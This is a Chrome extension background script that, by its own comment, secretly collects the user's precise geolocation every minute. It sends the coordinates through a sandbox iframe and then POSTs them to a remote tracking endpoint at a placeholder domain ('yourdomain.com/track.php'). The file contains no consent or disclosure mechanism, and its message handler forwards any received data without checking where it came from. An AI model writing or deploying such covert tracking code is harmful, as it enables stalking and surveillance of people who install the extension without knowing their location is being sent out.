// Runs in the background, sends the real location every minute

var iframe = document.getElementById('sandbox');

var getCoords = function(callback){
    navigator.geolocation.getCurrentPosition(function (position) {
        callback({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        });
    });
};

var sendLocation = function(){
    getCoords(function(position){
        iframe.contentWindow.postMessage(position, '*');
    });
};

chrome.runtime.onConnect.addListener(function(port) {
    port.onMessage.addListener(function(msg) {
        if(msg === 'getLocation'){
           getCoords(function(position){
               port.postMessage(position);
           });
        }
    });
});

window.addEventListener('message', function(e){
    try{
        var data = e.data;
        var xhr = new XMLHttpRequest();
        var formData = new FormData();

        formData.append('data', JSON.stringify(data));

        xhr.open("POST", "http://yourdomain.com/track.php", true);
        xhr.send(formData);
    }catch(e){}

}, false);

iframe.addEventListener('load', sendLocation);
chrome.alarms.onAlarm.addListener(sendLocation);

chrome.alarms.create('trackLocation', {
    periodInMinutes: 1
});

